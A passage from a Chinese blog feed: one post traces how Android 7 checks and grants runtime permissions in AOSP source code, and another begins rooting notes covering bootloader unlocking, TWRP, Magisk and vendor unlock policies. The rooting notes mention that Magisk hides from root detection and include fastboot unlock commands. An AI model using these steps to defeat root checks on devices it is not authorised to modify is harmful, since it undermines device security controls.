class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ActivityCompat.checkSelfPermission(activity, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED</span><br><span class="line">        &amp;&amp; ActivityCompat.checkSelfPermission(activity, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">    </span><br><span class="line">    ActivityCompat.requestPermissions(activity, <span class="keyword">new</span> String[]&#123;Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION&#125;, <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>检查权限使用了<code>ActivityCompat.checkSelfPermission()</code>方法，打开它的实现，进入<code>ContextCompat</code>类：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">checkSelfPermission</span><span class="params">(@NonNull Context context, @NonNull String permission)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (permission == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"permission is null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> context.checkPermission(permission, android.os.Process.myPid(), Process.myUid());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到调用了<code>Context</code>类的<code>checkPermission</code>方法，其实现是在<code>ContextImpl.java</code>中，与Android5相同不再赘述。</p><p>直到最后，在<code>PackageManagerService</code>中的<code>checkUidPermission</code>方法做校验时与之前版本的不同在于将位置权限做了另外的设置，即授予<code>ACCESS_COARSE_LOCATION</code>的前提是授予了<code>ACCESS_FINE_LOCATION</code>权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3170</span>    <span class="meta">@Override</span></span><br><span class="line"><span class="number">3171</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">checkUidPermission</span><span class="params">(String permName, <span class="keyword">int</span> uid)</span> </span>&#123;</span><br><span class="line"><span class="number">3172</span>        <span class="keyword">final</span> <span class="keyword">int</span> userId = UserHandle.getUserId(uid);</span><br><span class="line"><span class="number">3173</span></span><br><span class="line"><span class="number">3174</span>        <span class="keyword">if</span> (!sUserManager.exists(userId)) &#123;</span><br><span class="line"><span class="number">3175</span>            <span class="keyword">return</span> PackageManager.PERMISSION_DENIED;</span><br><span class="line"><span class="number">3176</span>        &#125;</span><br><span class="line"><span class="number">3177</span></span><br><span class="line"><span class="number">3178</span>        <span class="keyword">synchronized</span> (mPackages) &#123;</span><br><span class="line"><span class="number">3179</span>            Object obj = mSettings.getUserIdLPr(UserHandle.getAppId(uid));</span><br><span class="line"><span class="number">3180</span>            <span class="keyword">if</span> (obj != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">3181</span>                <span class="keyword">final</span> SettingBase ps = (SettingBase) obj;</span><br><span class="line"><span class="number">3182</span>                <span class="keyword">final</span> PermissionsState permissionsState = ps.getPermissionsState();</span><br><span class="line"><span class="number">3183</span>                <span class="keyword">if</span> (permissionsState.hasPermission(permName, userId)) &#123;</span><br><span class="line"><span class="number">3184</span>                    <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line"><span class="number">3185</span>                &#125;</span><br><span class="line"><span class="number">3186</span>                <span class="comment">// Special case: ACCESS_FINE_LOCATION permission includes ACCESS_COARSE_LOCATION</span></span><br><span class="line"><span class="number">3187</span>                <span class="keyword">if</span> (Manifest.permission.ACCESS_COARSE_LOCATION.equals(permName) &amp;&amp; permissionsState</span><br><span class="line"><span class="number">3188</span>                        .hasPermission(Manifest.permission.ACCESS_FINE_LOCATION, userId)) &#123;</span><br><span class="line"><span class="number">3189</span>                    <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line"><span class="number">3190</span>                &#125;</span><br><span class="line"><span class="number">3191</span>            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">3192</span>                ArraySet&lt;String&gt; perms = mSystemPermissions.get(uid);</span><br><span class="line"><span class="number">3193</span>                <span class="keyword">if</span> (perms != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">3194</span>                    <span class="keyword">if</span> (perms.contains(permName)) &#123;</span><br><span class="line"><span class="number">3195</span>                        <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line"><span class="number">3196</span>                    &#125;</span><br><span class="line"><span class="number">3197</span>                    <span class="keyword">if</span> (Manifest.permission.ACCESS_COARSE_LOCATION.equals(permName) &amp;&amp; perms</span><br><span class="line"><span class="number">3198</span>                            .contains(Manifest.permission.ACCESS_FINE_LOCATION)) &#123;</span><br><span class="line"><span class="number">3199</span>                        <span class="keyword">return</span> PackageManager.PERMISSION_GRANTED;</span><br><span class="line"><span class="number">3200</span>                    &#125;</span><br><span class="line"><span class="number">3201</span>                &#125;</span><br><span class="line"><span class="number">3202</span>            &#125;</span><br><span class="line"><span class="number">3203</span>        &#125;</span><br><span class="line"><span class="number">3204</span></span><br><span class="line"><span class="number">3205</span>        <span class="keyword">return</span> PackageManager.PERMISSION_DENIED;</span><br><span class="line"><span class="number">3206</span>    &#125;</span><br></pre></td></tr></table></figure><ul><li>如果检查权限返回-1，则需要请求权限：<code>ActivityCompat.requestPermissions(activity, new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, 1);</code> </li></ul><p>进入<code>activity.requestPermissions(permissions, requestCode);</code>:</p><p><a href="http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/app/Activity.java" target="_blank" rel="noopener">http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/app/Activity.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">requestPermissions</span><span class="params">(@NonNull String[] permissions, <span class="keyword">int</span> requestCode)</span> </span>&#123;</span><br><span class="line"><span class="number">4116</span>        <span class="keyword">if</span> (mHasCurrentPermissionsRequest) &#123;</span><br><span class="line"><span class="number">4117</span>            Log.w(TAG, <span class="string">"Can reqeust only one set of permissions at a time"</span>);</span><br><span class="line"><span class="number">4118</span>            <span class="comment">// Dispatch the callback with empty arrays which means a cancellation.</span></span><br><span class="line"><span class="number">4119</span>            onRequestPermissionsResult(requestCode, <span class="keyword">new</span> String[<span class="number">0</span>], <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="number">4120</span>            <span class="keyword">return</span>;</span><br><span class="line"><span class="number">4121</span>        &#125;</span><br><span class="line"><span class="number">4122</span>        Intent intent = getPackageManager().buildRequestPermissionsIntent(permissions);</span><br><span class="line"><span class="number">4123</span>        startActivityForResult(REQUEST_PERMISSIONS_WHO_PREFIX, intent, requestCode, <span class="keyword">null</span>);</span><br><span class="line"><span class="number">4124</span>        mHasCurrentPermissionsRequest = <span class="keyword">true</span>;</span><br><span class="line"><span class="number">4125</span>    &#125;</span><br></pre></td></tr></table></figure><p>弹出对话框，等待用户响应。</p><p>用户响应后，系统会调用<code>onRequestPermissionsResult()</code>执行后续操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, @NonNull String[] permissions,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">4145</span>            @NonNull <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line"><span class="number">4146</span>        <span class="comment">/* callback - no nothing */</span></span><br><span class="line"><span class="number">4147</span>    &#125;</span><br></pre></td></tr></table></figure><p>那么这里的结果是从哪来的呢。</p><p>回到上面弹出对话框的方法，这里的第一个参数who传入的值为<code>REQUEST_PERMISSIONS_WHO_PREFIX = &quot;@android:requestPermissions:&quot;</code></p><p>我们发现Activity类中有一个方法<code>dispatchActivityResult</code>,顾名思义是可以分发Activity执行结果的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6928</span>    <span class="function"><span class="keyword">void</span> <span class="title">dispatchActivityResult</span><span class="params">(String who, <span class="keyword">int</span> requestCode,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">6929</span>        <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line"><span class="number">6930</span>        <span class="keyword">if</span> (<span class="keyword">false</span>) Log.v(</span><br><span class="line"><span class="number">6931</span>            TAG, <span class="string">"Dispatching result: who="</span> + who + <span class="string">", reqCode="</span> + requestCode</span><br><span class="line"><span class="number">6932</span>            + <span class="string">", resCode="</span> + resultCode + <span class="string">", data="</span> + data);</span><br><span class="line"><span class="number">6933</span>        mFragments.noteStateNotSaved();</span><br><span class="line"><span class="number">6934</span>        <span class="keyword">if</span> (who == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">6935</span>            ......</span><br><span class="line"><span class="number">6936</span>        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (who.startsWith(REQUEST_PERMISSIONS_WHO_PREFIX)) &#123;</span><br><span class="line"><span class="number">6937</span>            who = who.substring(REQUEST_PERMISSIONS_WHO_PREFIX.length());</span><br><span class="line"><span class="number">6938</span>            <span class="keyword">if</span> (TextUtils.isEmpty(who)) &#123;</span><br><span class="line"><span class="number">6939</span>                dispatchRequestPermissionsResult(requestCode, data);</span><br><span class="line"><span class="number">6940</span>            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">6941</span>                Fragment frag = mFragments.findFragmentByWho(who);</span><br><span class="line"><span class="number">6942</span>                <span class="keyword">if</span> (frag != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="number">6943</span>                    dispatchRequestPermissionsResultToFragment(requestCode, data, frag);</span><br><span class="line"><span class="number">6944</span>                &#125;</span><br><span class="line"><span class="number">6945</span>            &#125;</span><br><span class="line"><span class="number">6946</span>        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (who.startsWith(<span class="string">"@android:view:"</span>)) &#123;</span><br><span class="line"><span class="number">6947</span>          ......</span><br><span class="line"><span class="number">6956</span>        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">6957</span>           ......</span><br><span class="line"><span class="number">6961</span>        &#125;</span><br><span class="line"><span class="number">6962</span>    &#125;</span><br></pre></td></tr></table></figure><p>进入<code>dispatchRequestPermissionsResult</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dispatchRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, Intent data)</span> </span>&#123;</span><br><span class="line"><span class="number">7081</span>        mHasCurrentPermissionsRequest = <span class="keyword">false</span>;</span><br><span class="line"><span class="number">7082</span>        <span class="comment">// If the package installer crashed we may have not data - best effort.</span></span><br><span class="line"><span class="number">7083</span>        String[] permissions = (data != <span class="keyword">null</span>) ? data.getStringArrayExtra(</span><br><span class="line"><span class="number">7084</span>                PackageManager.EXTRA_REQUEST_PERMISSIONS_NAMES) : <span class="keyword">new</span> String[<span class="number">0</span>];</span><br><span class="line"><span class="number">7085</span>        <span class="keyword">final</span> <span class="keyword">int</span>[] grantResults = (data != <span class="keyword">null</span>) ? data.getIntArrayExtra(</span><br><span class="line"><span class="number">7086</span>                PackageManager.EXTRA_REQUEST_PERMISSIONS_RESULTS) : <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line"><span class="number">7087</span>        onRequestPermissionsResult(requestCode, permissions, grantResults);</span><br><span class="line"><span class="number">7088</span>    &#125;</span><br></pre></td></tr></table></figure><p>可以看到把传进来的Intent中的权限申请结果传递给<code>onRequestPermissionsResult</code>。在申请权限的Activity中，开发者可以覆写<code>onRequestPermissionsResult</code>，执行后续操作。</p><p>至于结果是怎么来的，就涉及到<code>ActivityThread</code>类，它是应用Activity的入口，有一个main()方法，能够管理Activity，包括Activity执行结果传递。</p><p><a href="http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/app/ActivityThread.java" target="_blank" rel="noopener">http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/app/ActivityThread.java</a></p><p>回到打开申请权限的弹框Activity部分。通过Intent隐式启动该Activity，<code>Intent intent = getPackageManager().buildRequestPermissionsIntent(permissions);</code>.</p><p><code>getPackageManager()</code>返回一个<code>PackageManager</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Intent <span class="title">buildRequestPermissionsIntent</span><span class="params">(@NonNull String[] permissions)</span> </span>&#123;</span><br><span class="line"><span class="number">3403</span>        <span class="keyword">if</span> (ArrayUtils.isEmpty(permissions)) &#123;</span><br><span class="line"><span class="number">3404</span>           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"permission cannot be null or empty"</span>);</span><br><span class="line"><span class="number">3405</span>        &#125;</span><br><span class="line"><span class="number">3406</span>        Intent intent = <span class="keyword">new</span> Intent(ACTION_REQUEST_PERMISSIONS);</span><br><span class="line"><span class="number">3407</span>        intent.putExtra(EXTRA_REQUEST_PERMISSIONS_NAMES, permissions);</span><br><span class="line"><span class="number">3408</span>        intent.setPackage(getPermissionControllerPackageName());</span><br><span class="line"><span class="number">3409</span>        <span class="keyword">return</span> intent;</span><br><span class="line"><span class="number">3410</span>    &#125;</span><br></pre></td></tr></table></figure><p>在设备上打开一个权限弹框，通过命令<code>adb shell dumpsys activity top | grep ACTIVITY</code>得到弹框的Activity名：</p><p><code>com.android.packageinstaller.permission.ui.GrantPermissionsActivity</code></p><p><img src="permission_activity.png" alt=""></p><p><a href="http://androidxref.com/7.1.2_r36/xref/packages/apps/PackageInstaller/src/com/android/packageinstaller/permission/ui/GrantPermissionsActivity.java" target="_blank" rel="noopener">http://androidxref.com/7.1.2_r36/xref/packages/apps/PackageInstaller/src/com/android/packageinstaller/permission/ui/GrantPermissionsActivity.java</a></p><p>在<code>oncreate</code>中，首先从传入的Intent中读取Permissions:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mRequestedPermissions = getIntent().getStringArrayExtra(</span><br><span class="line">               PackageManager.EXTRA_REQUEST_PERMISSIONS_NAMES);</span><br></pre></td></tr></table></figure><p>加载应用的权限组，遍历所有权限，找到其对应的权限组，根据设备授予权限的策略，重新设置权限组的状态。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!group.isUserFixed() &amp;&amp; !group.isPolicyFixed()) &#123;</span><br><span class="line"><span class="number">148</span>                <span class="keyword">switch</span> (permissionPolicy) &#123;</span><br><span class="line"><span class="number">149</span>                    <span class="keyword">case</span> DevicePolicyManager.PERMISSION_POLICY_AUTO_GRANT: &#123;</span><br><span class="line"><span class="number">150</span>                        <span class="keyword">if</span> (!group.areRuntimePermissionsGranted()) &#123;</span><br><span class="line"><span class="number">151</span>                            group.grantRuntimePermissions(<span class="keyword">false</span>);</span><br><span class="line"><span class="number">152</span>                        &#125;</span><br><span class="line"><span class="number">153</span>                        group.setPolicyFixed();</span><br><span class="line"><span class="number">154</span>                    &#125; <span class="keyword">break</span>;</span><br><span class="line"><span class="number">155</span></span><br><span class="line"><span class="number">156</span>                    <span class="keyword">case</span> DevicePolicyManager.PERMISSION_POLICY_AUTO_DENY: &#123;</span><br><span class="line"><span class="number">157</span>                        <span class="keyword">if</span> (group.areRuntimePermissionsGranted()) &#123;</span><br><span class="line"><span class="number">158</span>                            group.revokeRuntimePermissions(<span class="keyword">false</span>);</span><br><span class="line"><span class="number">159</span>                        &#125;</span><br><span class="line"><span class="number">160</span>                        group.setPolicyFixed();</span><br><span class="line"><span class="number">161</span>                    &#125; <span class="keyword">break</span>;</span><br><span class="line"><span class="number">162</span></span><br><span class="line"><span class="number">163</span>                    <span class="keyword">default</span>: &#123;</span><br><span class="line"><span class="number">164</span>                        <span class="keyword">if</span> (!group.areRuntimePermissionsGranted()) &#123;</span><br><span class="line"><span class="number">165</span>                            mRequestGrantPermissionGroups.put(group.getName(),</span><br><span class="line"><span class="number">166</span>                                    <span class="keyword">new</span> GroupState(group));</span><br><span class="line"><span class="number">167</span>                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">168</span>                            group.grantRuntimePermissions(<span class="keyword">false</span>);</span><br><span class="line"><span class="number">169</span>                            updateGrantResults(group);</span><br><span class="line"><span class="number">170</span>                        &#125;</span><br><span class="line"><span class="number">171</span>                    &#125; <span class="keyword">break</span>;</span><br><span class="line"><span class="number">172</span>                &#125;</span><br><span class="line"><span class="number">173</span>            &#125;</span><br></pre></td></tr></table></figure><p>可以看到重点在<code>group.grantRuntimePermissions</code>，<code>group.revokeRuntimePermissions</code>，一个授予权限，一个撤销权限，属于一体两面，以下之分析<code>grantRuntimePermissions</code>。</p><p>group即<code>AppPermissionGroup</code>，找到<code>grantRuntimePermissions</code></p><p><a href="http://androidxref.com/7.1.2_r36/xref/packages/apps/PackageInstaller/src/com/android/packageinstaller/permission/model/AppPermissionGroup.java" target="_blank" rel="noopener">http://androidxref.com/7.1.2_r36/xref/packages/apps/PackageInstaller/src/com/android/packageinstaller/permission/model/AppPermissionGroup.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// Grant the permission if needed.</span></span><br><span class="line"><span class="number">344</span>                <span class="keyword">if</span> (!permission.isGranted()) &#123;</span><br><span class="line"><span class="number">345</span>                    permission.setGranted(<span class="keyword">true</span>);</span><br><span class="line"><span class="number">346</span>                    mPackageManager.grantRuntimePermission(mPackageInfo.packageName,</span><br><span class="line"><span class="number">347</span>                            permission.getName(), mUserHandle);</span><br><span class="line"><span class="number">348</span>                &#125;</span><br><span class="line"><span class="number">349</span></span><br><span class="line"><span class="number">350</span>                <span class="comment">// Update the permission flags.</span></span><br><span class="line"><span class="number">351</span>                <span class="keyword">if</span> (!fixedByTheUser) &#123;</span><br><span class="line"><span class="number">352</span>                    <span class="comment">// Now the apps can ask for the permission as the user</span></span><br><span class="line"><span class="number">353</span>                    <span class="comment">// no longer has it fixed in a denied state.</span></span><br><span class="line"><span class="number">354</span>                    <span class="keyword">if</span> (permission.isUserFixed() || permission.isUserSet()) &#123;</span><br><span class="line"><span class="number">355</span>                        permission.setUserFixed(<span class="keyword">false</span>);</span><br><span class="line"><span class="number">356</span>                        permission.setUserSet(<span class="keyword">false</span>);</span><br><span class="line"><span class="number">357</span>                        mPackageManager.updatePermissionFlags(permission.getName(),</span><br><span class="line"><span class="number">358</span>                                mPackageInfo.packageName,</span><br><span class="line"><span class="number">359</span>                                PackageManager.FLAG_PERMISSION_USER_FIXED</span><br><span class="line"><span class="number">360</span>                                        | PackageManager.FLAG_PERMISSION_USER_SET,</span><br><span class="line"><span class="number">361</span>                                <span class="number">0</span>, mUserHandle);</span><br><span class="line"><span class="number">362</span>                    &#125;</span><br><span class="line"><span class="number">363</span>                &#125;</span><br><span class="line"><span class="number">364</span>            &#125;</span><br></pre></td></tr></table></figure><p>这里调用<code>PackageManager</code>类的<code>grantRuntimePermission</code>方法授予权限，<code>updatePermissionFlags</code>方法更新权限状态，<code>PackageManager</code>类为抽象类，实现在<code>ApplicationPackageManagerService</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span><br><span class="line"><span class="number">641</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">grantRuntimePermission</span><span class="params">(String packageName, String permissionName,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">642</span>            UserHandle user)</span> </span>&#123;</span><br><span class="line"><span class="number">643</span>        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">644</span>            mPM.grantRuntimePermission(packageName, permissionName, user.getIdentifier());</span><br><span class="line"><span class="number">645</span>        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line"><span class="number">646</span>            <span class="keyword">throw</span> e.rethrowFromSystemServer();</span><br><span class="line"><span class="number">647</span>        &#125;</span><br><span class="line"><span class="number">648</span>    &#125;</span><br></pre></td></tr></table></figure><p><code>mPM</code>为IPackageManager，涉及到进程间通信，ApplicationPackageManagerService为客户端，IPackageManager为服务端，实现类为<code>PackageManagerService</code>。</p><p><code>PackageManagerService</code>类负责设备上所有应用的权限管理，根据Intent匹配四大组件，安装/删除应用。最终更新过的应用权限状态被写在<code>/data/system/users/0/runtime-permissions.xml中</code>中。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;*郑重声明：本文内容只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Android权限控制是对应用访问设备信息和接口的限制，其作用是保护Android用户的隐私。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A
      
    
    </summary>
    
    
      <category term="Android源码分析" scheme="http://yoursite.com/categories/Android%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android刷机笔记（一）</title>
    <link href="http://yoursite.com/2020/12/17/Android%E5%88%B7%E6%9C%BA%E7%AC%94%E8%AE%B0(%E4%B8%80)/"/>
    <id>http://yoursite.com/2020/12/17/Android%E5%88%B7%E6%9C%BA%E7%AC%94%E8%AE%B0(%E4%B8%80)/</id>
    <published>2020-12-17T05:52:20.000Z</published>
    <updated>2020-12-17T07:16:28.875Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*郑重声明：本文内容只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</strong></p><p>我们的最终目标是获取设备root权限，之后就可以实现我们想要但手机厂商没有提供的功能了。</p><p>Android设备root有两个思路。一是将<code>su</code>程序放在/system分区，系统启动时就可以获得相应权限。但是，/system分区只能读不能写，就需要找到系统漏洞，将<code>su</code>程序写入。因此，以前检测设备是否root的方法是检查/system/bin,/system/xbin等目录下是否有su程序。之前的很多一键root工具就是这样实现的，但是Android 6之后就越来越难了。</p><p>第二个思路就是刷入第三方recovery后安装root管理工具，或通过对官方提供的刷机包boot.img打补丁，然后安装Magisk的方式实现root。root权限管理工具可以使用Supersu和Magisk。Supersu只支持到Android8 ，Magisk一直在维护。另外，Magisk还能隐藏起来，躲过root检测，因此，我们主要研究Magisk。</p><p>刷入recovery获取root权限主要步骤：</p><ol><li><p>解锁bootloader</p></li><li><p>获取与机型匹配的TWRP包，并刷入设备；</p></li><li><p>加载MagisK/Supersu管理工具</p></li></ol><h2 id="解锁Bootloader"><a href="#解锁Bootloader" class="headerlink" title="解锁Bootloader"></a>解锁Bootloader</h2><p>为什么要解锁Bootloader呢？这需要从系统的启动讲起。</p><p>一般情况下，开机引导程序Bootloader执行后，Android有三种启动模式：</p><ol><li>fastboot: 仅初始化了内核，能够通过PC端控制手机，将系统镜像刷入手机的各个分区，包括内核</li><li>recovery：已经加载了部分文件系统，能够读取刷入系统更新包</li><li>main system：正常开机启动的系统</li></ol><p>Bootloader相当于PC系统的BIOS,负责初始化硬件，开机自检，指引后续操作系统启动。Bootloader完成硬件初始化后，可以通过fastboot引导进入正常的系统启动模式或者recovery系统。这里的recocery系统就是我们即将刷入的系统。正常的操作系统即手机厂商提供的系统。</p><p>目前，很多厂商都对Bootloader上了锁，即对加载的系统固件做验证，若刷入第三方修改的固件，则验证不通过无法加载。需要向厂商申请解锁，已解锁的设备在加载固件时会忽略验证失败的结果，完成后续加载。</p><p>目前主流厂商设备解锁情况：</p><ul><li>小米：在官方论坛申请解锁，通过后下载解锁工具安卓步骤解锁。申请通过的时长不确定，有秒通过的，也有一周才通过的。地址：<a href="http://www.miui.com/unlock/index.html" target="_blank" rel="noopener">http://www.miui.com/unlock/index.html</a></li><li>一加：可直接在设备开发者选项中解锁OEM。去论坛下载工具箱：<a href="https://www.oneplusbbs.com/" target="_blank" rel="noopener">https://www.oneplusbbs.com/</a>，或下载大侠阿木工具箱：<a href="https://www.daxiaamu.com/5864/" target="_blank" rel="noopener">https://www.daxiaamu.com/5864/</a></li><li>OPPO：部分机型可解锁。需要下载深度测试APP，提交申请后由厂商审核通过才能解锁，需要2到3个月。</li><li>realme：可在开发者选项中解锁OEM。然后下载安卓深度测试APP，提交申请后由厂商审核才能解锁。数量有限制，每个月解锁1000名。</li><li>华为：2018年关闭了申请解锁码的通道，据网上流传，可以从淘宝购买解锁码。也可以参考：<a href="https://www.52pojie.cn/thread-816065-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-816065-1-1.html</a>的方法，需要首先回退系统版本，尝试root。root成功之后再解锁bootloader, 然后再刷入新的ROM。</li><li>VIVO：不能解锁。</li></ul><p>不做解锁限制的设备，可以参考<a href="https://www.jianshu.com/p/54edc48203db" target="_blank" rel="noopener">https://www.jianshu.com/p/54edc48203db</a>。</p><ul><li>首先，进入fastboot模式（一般设备是按住【power】和【音量+】，有的是【音量-】）</li><li>通过<code>fastboot flashing unlock</code>命令解锁</li><li>执行命令<code>fastboot flash</code>+ 分区 + 